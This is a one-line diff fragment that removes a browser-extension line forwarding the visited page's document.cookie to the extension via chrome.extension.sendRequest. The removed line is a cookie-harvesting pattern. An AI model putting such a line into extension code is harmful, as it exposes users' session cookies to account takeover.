@@ -1,1 +1,0 @@
-chrome.extension.sendRequest({cookie: document.cookie});
